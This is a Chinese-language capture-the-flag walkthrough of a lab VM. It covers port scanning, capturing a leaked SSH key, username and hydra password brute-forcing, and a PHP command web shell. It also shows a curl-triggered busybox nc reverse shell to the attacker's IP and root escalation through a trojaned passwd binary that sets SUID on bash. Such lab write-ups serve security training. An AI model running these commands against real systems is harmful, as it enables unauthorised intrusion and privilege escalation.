# 一、信息收集

## 1. 主机发现与端口扫描

首先，在本地网络中使用 `arp-scan` 发现目标主机的 IP 地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**
通过 `arp-scan` 扫描，确定目标主机 IP 为 `192.168.205.136`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.136 08:00:27:f7:e4:36       PCS Systemtechnik GmbH
...
```

**端口扫描:**
`nmap` 的扫描结果显示，目标主机开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.136
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

## 2. Web 服务侦察

访问 80 端口的 Web 服务，发现是一个标准的网站模板。在查看网页源代码时，发现一条关键注释，提示监听特定端口。

```html
<!-- Pay attention to listen 12345 -->
```

这个线索暗示目标主机可能会在 UDP 12345 端口上泄露某些信息。

# 二、初始访问

## 1. 发现并捕获 SSH 私钥泄露

根据 Web 源码中的提示，使用 `tcpdump` 监听目标主机与 UDP 12345 端口相关的流量。很快，我们捕获到目标主机正在广播一个经过加密的 SSH 私钥。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A host 192.168.205.136 and port 12345
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDli31tjr
...
```

**注意**：使用 `tcpdump` 命令行工具可能会因数据包分片而导致私钥捕获不完整。在此场景下，启动 `Wireshark` 图形化界面并使用"追踪流" -> "UDP流"功能，可以确保捕获到完整的私钥。

![image-20250807220801182](http://7r1UMPHK.github.io/image/20250807220801567.webp)

## 2. 破解私钥密码并爆破用户名

我们将捕获到的完整私钥保存为 `id_rsa` 文件。尝试直接使用该私钥登录失败，表明它被密码保护。

在尝试连接 SSH 时，我们收到了一个包含 "jocke?" 艺术字的横幅，这是破解密码的关键提示。

经过尝试，确认私钥的密码就是 `jocke`。

接下来是确定用户名。由于私钥中通常包含的用户名信息已被移除，我们编写了一个简单的脚本来爆破用户名。最终发现用户名为 `jockey`。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ c='abcdefghijklmnopqrstuvwxyz'; for (( i=0; i<${#c}; i++ )); do echo "jocke${c:$i:1}"; done > user

┌──(kali㉿kali)-[/tmp]
└─$ while read -r u;do echo "$u";ssh -i id_rsa "$u@192.168.205.136" -o PasswordAuthentication=no;done < user
...
jockey
...

┌──(kali㉿kali)-[/tmp]
└─$ ssh jockey@192.168.205.136 -i id_rsa
Enter passphrase for key 'id_rsa': [输入 jocke]
...
[rbash]:$
```

成功登录后，发现我们被限制在一个 `rbash` (Restricted Bash) 环境中，许多常用命令无法执行。

# 三、权限提升

## 1. 从受限 Shell 到可用 Shell

在 `rbash` 环境中，通过 `ls` 和 `cat` 等有限的命令进行探索，发现了两个关键点：

*   **用户 Flag**: `user.txt` 位于家目录下，可以直接读取。
*   **Web 后门**: 在 `/var/www/html/jockey_hack/` 目录下存在一个名为 `test.php` 的文件，这是一个简单的命令执行后门。

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

利用这个后门，我们可以在本地监听端口，并通过 `curl` 访问该 PHP 文件来获取一个反向 Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
```

**触发反弹 Shell:**

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.205.136/jockey_hack/test.php?cmd=busybox+nc+192.168.205.128+8888+-e+/bin/bash'
```

获取到的新 Shell 虽然是 `bash`，但其环境变量 `PATH` 被修改，导致命令无法正常使用。通过 `jockey` 用户家目录下的 `.bashrc` 文件可以确认这一点。我们首先需要手动设置一个正常的 `PATH` 环境变量来恢复 Shell 的功能。

```bash
jockey@Fake:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## 2. 从 `jockey` 用户到 `backup` 用户

在 `jockey` 的家目录中，一个名为 `note.txt` 的文件写着 "I like to backup."，这强烈暗示 `backup` 用户是下一个目标。通过 `cat /etc/passwd` 我们发现 `backup` 用户存在，但其登录 Shell 被设置为 `/usr/sbin/nologin`。

然而，经过检查发现 `/usr/sbin/nologin` 文件实际上是一个被替换的 `/bin/bash` 副本，这是一个隐藏的后门。

```bash
jockey@Fake:~$ dpkg -V
...
??5??????   /usr/bin/passwd
...
??5??????   /usr/sbin/nologin

jockey@Fake:/tmp$ ls -al /usr/sbin/nologin
-rwxr-xr-x 1 root root 1168776 May 18 23:38 /usr/sbin/nologin

jockey@Fake:/tmp$ diff /usr/sbin/nologin /bin/bash

```

接下来，使用 `hydra` 对 `backup` 用户的 SSH 密码进行爆破，成功获得密码 `12345`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l backup -P /path/to/password-list.txt ssh://192.168.205.136
...
[22][ssh] host: 192.168.205.136   login: backup   password: 12345
```

使用新凭据登录 `backup` 用户。

## 3. 从 `backup` 用户到 `root`

登录 `backup` 用户后，在其家目录 `/var/backups` 下，发现了一个名为 `passwd_bak` 的文件。通过与系统当前的 `/usr/bin/passwd` 文件进行对比，发现后者已被修改。

```bash
backup@Fake:~$ which passwd
/usr/bin/passwd
backup@Fake:~$ diff passwd_bak /usr/bin/passwd
Binary files passwd_bak and /usr/bin/passwd differ
```

使用 `strings` 命令分析被修改的 `/usr/bin/passwd` 文件，发现它会加载一个恶意的共享库：`/etc/.libc/evil.so`。

继续分析 `/etc/.libc/evil.so`，发现它会在被加载时执行一个脚本 `/var/backups/evil.sh`。

由于 `backup` 用户对 `/var/backups` 目录有写入权限，我们可以利用这个机制进行提权。

1. **创建 Payload**: 创建 `/var/backups/evil.sh` 脚本，内容为给 `/bin/bash` 添加 SUID 权限，并赋予其可执行权限。

   ```bash
   backup@Fake:~$ echo 'chmod +s /bin/bash' > /var/backups/evil.sh
   backup@Fake:~$ chmod +x /var/backups/evil.sh
   ```

2. **触发木马**: 执行被修改过的 `passwd` 命令。该命令拥有 SUID root 权限，因此它加载的 `evil.so` 库以及执行的 `evil.sh` 脚本都将以 root 身份运行。

   ```bash
   backup@Fake:~$ passwd
   ```

3. **获取 Root Shell**: `passwd` 命令执行后，`/bin/bash` 就被设置了 SUID 位。此时，我们只需执行 `bash -p` 即可获得一个 root 权限的 Shell。

   ```bash
   backup@Fake:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   backup@Fake:~$ bash -p
   bash-5.0# id
   uid=34(backup) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)
   ```

# 四、夺取旗帜

成功获取 `root` 权限后，读取最终的旗帜文件。

```bash
bash-5.0# cat /home/jockey/user.txt
flag{user-7fc904f5c88c07c18b558dc203729555}

bash-5.0# cat /root/root.txt
flag{root-3a7d567ac33be7bb8a77a7ce96d35913}
```

渗透测试完成。